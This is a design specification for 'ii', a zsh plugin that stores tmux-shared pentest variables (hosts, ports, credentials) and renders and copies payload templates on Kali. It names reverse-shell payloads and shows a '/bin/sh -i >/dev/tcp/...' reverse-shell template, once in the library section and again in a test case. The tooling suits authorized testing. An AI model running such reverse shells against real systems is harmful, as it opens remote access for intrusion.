---
tags:
aliases:
document_type: spec
field:
description: ii zsh plugin specification
---

# ii Spec

`ii` is a zsh plugin for tmux-scoped workflow variables and payload rendering.

The plugin is designed for tmux-heavy terminal workflows where multiple panes
need to share target values, render payload templates, and copy the rendered
payload without stale shell state.

## Product Goals

`ii` manages five concerns:

```text
1. tmux session-scoped variables
2. current pane variable loading
3. payload template selection
4. payload rendering
5. clipboard or tmux-buffer copy
```

The primary constraints:

```text
- Values must be shared across panes in the same tmux session.
- Payload rendering must read fresh tmux session values every time.
- The current shell should only receive variables when explicitly loaded.
- Copy behavior must not break inside tmux or on payloads with special chars.
- The codebase should be plugin-first and split by responsibility layers.
- Kali deployment should work by installing the generated `export/ii` directory.
- Bundled payloads should work without requiring users to export II_PAYLOAD_DIR.
```

## State Model

There are two separate variable states:

```text
tmux session environment = source of truth shared by all panes, internally II_ prefixed
current shell environment = local state for the current pane, without II_ prefix
```

Command behavior follows this model:

```text
ii s   writes internal II_ names to tmux and unprefixed names to current shell
ii l   loads tmux session values into current shell without II_ prefix
ii ls  reads non-empty tmux session values and displays them without II_ prefix
ii i   reads tmux session values, then copies selected variable values
ii p   reads tmux session values directly while rendering
```

`ii s` and `ii l` export both uppercase and lowercase shell names. A pane that
has loaded values keeps a prompt-time sync hook enabled so prompt integrations
that rewrite lowercase names such as `lhost` do not immediately override loaded
tmux values.

This distinction is required:

```text
echo $LHOST          needs ii l first in that pane
ii p render payload   does not need ii l; it reads tmux directly
```

## Public Interface

### Dispatcher

```text
ii COMMAND [ARGS]
```

Dispatches to command implementations:

```text
ii set
ii load
ii interactive
ii ls
ii payload
ii unset
ii help
```

### Short Subcommands

```text
ii s
ii l
ii i
ii ls
ii p
ii h
```

Final naming decision:

```text
ii s = ii set
ii l = ii load
ii i = ii interactive
ii ls = variable list
ii p = ii payload
ii h = ii help
```

`ii p` is payload-only. Variable listing belongs to `ii ls`.

## Command Specs

### `ii set NAME VALUE`

Short form:

```text
ii s NAME VALUE
```

With no arguments:

```text
ii s
```

opens a TUI for common variables:

```text
DOMAIN
LHOST
RHOST
LPORT
RPORT
USER1
PASSWD1
HASH1
USER2
PASSWD2
HASH2
```

With one filter argument, match variable names before prompting for a value. No
matches prints `no matched`; one match goes straight to the value prompt;
multiple matches open a selection prompt. Single-letter shortcuts include `r`
for `RHOST`, `l` for `LHOST`, and `d` for `DOMAIN`:

```zsh
ii s r
ii s:r
ii s:l
ii s:d
```

`-d` means detect. It is only supported for `LHOST` and detects the IPv4 address
from an interface. The default interface is `tun0`.

```zsh
ii s:lhost -d
ii s:lhost -d eth0
ii s:l -d
ii s -d
```

Behavior:

```text
1. Normalize NAME into II_NAME.
   Names are canonicalized to uppercase, so user2 and USER2 both become II_USER2.
2. Validate the normalized variable name.
3. Store II_NAME=VALUE in the current tmux session environment.
4. Export uppercase and lowercase shell variables into the current shell.
5. Enable loaded-variable sync for the current shell.
6. Print NAME=VALUE without the internal II_ prefix.
```

Example:

```zsh
ii s LHOST 192.168.45.192
ii s LPORT 443
ii s RHOST 192.168.201.175
ii s RPORT 80
```

Stored values:

```text
II_LHOST=192.168.45.192
II_LPORT=443
II_RHOST=192.168.201.175
II_RPORT=80
```

User-facing shell values:

```text
LHOST=192.168.45.192
lhost=192.168.45.192
LPORT=443
lport=443
RHOST=192.168.201.175
rhost=192.168.201.175
RPORT=80
rport=80
```

### `ii load`

Short form:

```text
ii l
```

Behavior:

```text
1. Read all II_ variables from the current tmux session.
2. Validate each variable name before export.
3. Export each variable into the current shell without the II_ prefix.
   Both uppercase and lowercase shell names are exported.
4. Do not export default variable names that have not been assigned values.
5. Enable loaded-variable sync for the current shell.
6. Print the number of loaded variables.
```

Purpose:

```text
Synchronize an existing pane after another pane has changed tmux session values.
```

Example:

```zsh
ii l
echo $LHOST
```

### `ii interactive`

Short form:

```text
ii i
```

Behavior:

```text
1. Read configured II_ variables from tmux.
2. Merge them with default variable names.
3. Present names in fzf with a single-line value preview.
4. Show the selected variable value in a bottom preview pane.
5. Support case-insensitive fuzzy search.
6. Enter edits the selected variable value.
7. Ctrl-S prompts for a new variable name and value.
8. Ctrl-X deletes the selected variable.
9. Ctrl-Y copies selected existing variable values.
10. Show `add new variable` as the final option.
11. If `add new variable` is selected, prompt for a variable name and value.
   A name without a value stores an empty value.
12. Support Tab multi-select.
13. Copy selected existing variable values through the configured copy layer.
14. Print the copied values.
15. Do not export values into the current shell unless loaded-variable sync was
    already enabled by `ii s` or `ii l` in that shell.
16. Display a nano-style keys block at the bottom of the preview pane.
```

This command is a variable copy/add layer, not a shell loading layer. Use
`ii l` to load non-empty tmux variables into the current shell.

### `ii ls [PATTERN]`

Behavior:

```text
1. Read all II_ variables from tmux.
2. Skip empty values.
3. If PATTERN is omitted, print every non-empty variable.
4. If PATTERN is present, filter by key name only, case-insensitively.
5. Print each match as key line, value line, blank line.
6. Do not open fzf.
7. Do not filter values.
```

Examples:

```zsh
ii ls
ii ls host
ii ls user
ii ls port
ii ls d
```

Expected output:

```text
LHOST
192.168.45.192

RHOST
192.168.201.175

LPORT
443

RPORT
80
```

Expected fallback filtering:

```text
ii ls port   matches LPORT and RPORT
ii ls 443    does not match LPORT=443 unless the variable name contains 443
```

### `ii payload [CATEGORY]`

Short form:

```text
ii p [CATEGORY]
```

Behavior:

```text
1. Resolve the payload library directory.
2. Scan payload files and display path-style entries.
3. Apply optional category filtering.
4. Let fzf handle fuzzy search and selection with rendered payload preview.
   The selector list includes a single-line rendered preview.
5. Resolve the selected entry to a payload file.
6. Render the template with fresh tmux II_ values.
   Missing or empty values render as lowercase shell fallbacks like $rhost.
7. Copy the rendered payload.
8. Print the rendered payload.
9. Print variables used by the selected payload.
10. Display description and keys as independent preview blocks so they stay
    visible across payload sizes. Reserve the description block even when no
    description exists.
```

Categories:

```text
all      all payloads
shell    shell/*
script   script/*
linux    */linux/*
windows  */windows/*
sqli     sqli/*
xss      xss/*
```

`script/*` is for custom script snippets. Files can use `${II_NAME}`
placeholders, or literal shell variables such as `$rhost`. If no renderable
placeholder is present, the selected script text is copied literally.

Payload files may start with a metadata line:

```text
# description: short operator-facing description
```

The description is shown in a reserved description block above the preview body,
but is omitted from copied and printed payload output. Payloads without a
description still reserve the same block with an empty content line.

First implementation supports argument-based category filtering:

```zsh
ii p
ii p shell
ii p script
ii p linux
ii p windows
ii p sqli
ii p xss
```

Future interactive switch support may use fzf keybinds:

```text
ctrl-a  switch to all
ctrl-s  switch to shell
ctrl-l  switch to linux
ctrl-w  switch to windows
ctrl-q  quit
```

### `ii unset NAME [...]`

Behavior:

```text
1. Normalize each NAME into II_NAME.
2. Remove the variable from the current tmux session.
3. Unset the variable in the current shell.
4. Print each unset variable.
```

### `ii unset -a`

Behavior:

```text
1. Prompt before deleting all II_ variables in the current tmux session.
2. Continue only when the answer is exactly y.
3. Remove every II_ variable from the current tmux session.
4. Unset matching uppercase and lowercase shell variables.
5. Print the number of removed variables.
```

### `ii help [COMMAND]`

Behavior:

```text
1. Without COMMAND, print the top-level command summary.
2. With COMMAND, route to that command's own --help implementation.
```

Each command owns its help text so new behavior is documented near the command.

## Payload Library

Default path:

```text
~/.config/ii/payloads/
```

Recommended layout:

```text
payloads/
  shell/
    linux/
      bash-tcp
      sh-tcp
      nc-mkfifo
    windows/
      powershell-rev
  script/
    config/
      hosts
    tool/
      ii/
        detect-lhost
      nmap/
        nmap
  xss/
    basic-alert
```

Selector display format:

```text
shell/linux/bash-tcp
shell/linux/sh-tcp
shell/linux/nc-mkfifo
shell/windows/powershell-rev
script/config/hosts
script/tool/ii/detect-lhost
script/tool/nmap/nmap
xss/basic-alert
```

Payload templates are plain text files.

Preferred placeholder form:

```text
${II_LHOST}
${II_LPORT}
${II_DOMAIN}
```

Example:

```text
/bin/sh -i >/dev/tcp/${II_LHOST}/${II_LPORT} 2>&1 0>&1
```

## Payload Render Layer

Render must be isolated from current shell state.

Input:

```text
selected payload file
current tmux session II_ variables
```

Output:

```text
rendered payload string
used variable report
```

Required behavior:

```text
1. Read the selected payload file as plain text.
   A first-line `# description:` metadata line is not part of the render body.
2. Read tmux session environment at render time.
3. Replace `${II_NAME}` placeholders with tmux values.
4. Support bare `II_NAME` replacement for compatibility.
5. Render missing or empty tmux values as lowercase shell fallbacks like `$rhost`.
6. Report every variable required by the template, using shell fallback text for
   missing or empty values.
```

Important test case:

```text
pane1: ii s LHOST 10.10.10.10
pane1: ii s LPORT 9001
pane2: echo $LHOST
pane2: ii p linux
```

Expected:

```text
echo $LHOST prints empty output in pane2
ii p renders /bin/sh -i >/dev/tcp/10.10.10.10/9001 ...
```

## Fuzzy Search Layer

`fzf` is the selection UI for:

```text
ii i = variable selection
ii p = payload selection
```

Responsibilities:

```text
ii i:
  - Input: default variable names plus II_ variable lines from tmux.
  - UI: fzf with --multi.
  - Display: variable name, single-line value preview, and red "more" marker
    when the full value is longer than the displayed preview.
  - Preview: full selected value with a bottom keys block.
  - Output: selected display lines mapped back to names and values.
  - Next layer: edit, delete, add, or copy behavior.

ii p:
  - Input: path-style payload entries.
  - UI: fzf selector with single-line rendered preview plus independent
    description and keys blocks in the bottom preview.
  - Output: one selected payload path.
  - Next layer: payload render.
```

Non-interactive fzf testing uses:

```zsh
FZF_DEFAULT_OPTS='--filter=sh-tcp' ii p linux
```

When `fzf --filter` returns multiple matches, `ii p` should use the first
non-empty selected line. This keeps test mode deterministic and prevents
multi-line strings from being interpreted as one path.

## Variable Loading Layer

Variable loading must be separate from payload rendering.

Responsibilities:

```text
ii_var_normalize_name:
  - Strip leading "export ".
  - Strip anything after "=".
  - Uppercase the name.
  - Add II_ prefix when missing.
  - Validate against II_[A-Z_][A-Z0-9_]*.

ii_var_lines_from_tmux:
  - Read tmux show-environment.
  - Return only II_ assignments.

ii_export_var_line:
  - Validate NAME before export.
  - Export NAME=VALUE and lowercase name=value into current shell.
  - Use global exported assignment so existing shell variables are overwritten.

ii_enable_loaded_var_sync:
  - Enable prompt-time sync after `ii s` or `ii l`.
  - Keep the sync hook last in `precmd_functions` so prompt integrations that
    rewrite lowercase names are corrected before the next command.

ii_var_display_lines_for_fzf:
  - Convert II_LHOST=... to LHOST=... for TUI display.
  - Do not change tmux storage format.

ii_var_line_from_display:
  - Convert selected LHOST=... back to II_LHOST=... before export.
```

Do not export arbitrary tmux environment lines.

## Copy Layer

Copy behavior is intentionally separated because payloads may contain spaces,
quotes, shell metacharacters, newlines, and other special characters.

Current strategy:

```text
1. If II_CLIP_BACKEND is set, use that named backend.
2. If II_CLIP_CMD is set, pipe rendered payload to that command.
3. Otherwise prefer OSC52 inside tmux or SSH when base64 is available.
4. Otherwise auto-detect clip.exe, wl-copy, xclip, xsel, pbcopy.
5. If no clipboard tool is found inside tmux, pipe to tmux load-buffer -.
```

Supported named backend:

```text
osc52
```

OSC52 is intended for tmux or SSH sessions where the remote Kali shell should
copy text to the local terminal clipboard. Inside tmux, the OSC52 backend first
tries `tmux load-buffer -w -` so tmux handles clipboard integration. If that
fails, the payload is base64 encoded and wrapped in OSC52; inside tmux, that
sequence is wrapped in tmux passthrough escape framing.

Kali over SSH or tmux deployment uses OSC52 by default when possible. To force
OSC52 explicitly, set:

```zsh
export II_CLIP_BACKEND=osc52
```

Do not require X server or Wayland clipboard packages for this workflow.

Preferred tmux behavior:

```text
print -rn -- "$rendered" | tmux load-buffer -
```

Reason:

```text
stdin-based copy avoids passing payload content as a tmux command argument.
This is safer for special characters and less likely to break inside tmux.
```

If OSC52 is unsupported by the terminal, users can override the backend with
`II_CLIP_CMD` or `II_CLIP_BACKEND`.

## Plugin Architecture

`ii` is plugin-first.

Public entrypoint:

```text
ii.plugin.zsh
```

Plugin-level settings:

```text
II_PLUGIN_DIR   defaults to the plugin root directory
II_PAYLOAD_DIR  defaults to ${II_PLUGIN_DIR}/payloads unless already set
```

Users only need to set `II_PAYLOAD_DIR` when they want an external payload
library.

Layer files:

```text
lib/tmux.zsh        tmux and external command checks
lib/clipboard.zsh   copy backend detection and copy
lib/fzf.zsh         shared fzf input and preview helpers
lib/var_helpers.zsh variable helpers and candidate generation
lib/var_interactive.zsh interactive variable selection, add, and edit flows
lib/vars.zsh        variable command entrypoints
lib/payloads.zsh    payload list, fuzzy selection, render, reports
lib/help.zsh        help routing
lib/core.zsh        dispatcher and command functions
```

Load order:

```text
1. tmux.zsh
2. clipboard.zsh
3. fzf.zsh
4. var_helpers.zsh
5. var_interactive.zsh
6. vars.zsh
7. payloads.zsh
8. help.zsh
9. core.zsh
```

## Deployment Package

`script/make` builds the deployable plugin directory:

```text
export/ii/
  ii.plugin.zsh
  lib/
  payloads/
  README.md
```

`export/` is generated output and should not be edited by hand. Deployment
should copy `export/ii` as one unit.

## Help Audit Script

`script/help` is a development helper for comparing registered command help
against this spec. It sources the local `ii.plugin.zsh` and prints:

```text
ii help
ii help set
ii help load
ii help interactive
ii help ls
ii help payload
ii help unset
```

The script must call the registered help implementations instead of duplicating
help text. It is not part of the deployable `export/ii` package.
```

## Implementation Status

Implemented:

```text
- plugin entrypoint: ii.plugin.zsh
- plugin-provided default II_PLUGIN_DIR and II_PAYLOAD_DIR
- layered lib/ structure
- ii dispatcher with short subcommands: s, l, i, v, p, h
- tmux session variable source of truth
- argument-based payload filtering
- fzf payload and variable selection
- nano-style fzf bottom shortcut hints
- interactive variable edit, add, delete, and copy flows
- fresh tmux-based payload rendering
- payload description metadata
- deterministic non-interactive fzf filter behavior
- stdin-based tmux buffer fallback for copy
- default OSC52 backend for tmux/SSH clipboard copy
- `ii s:lhost -d [INTERFACE]` interface IPv4 detection
- generated `export/ii` deployment package through `script/make`
- `script/help` registered-help audit script
```

Not implemented yet:

```text
- fzf keybinds for in-TUI category switching
- formal automated test script
- strict warning for missing variables in payload templates
```
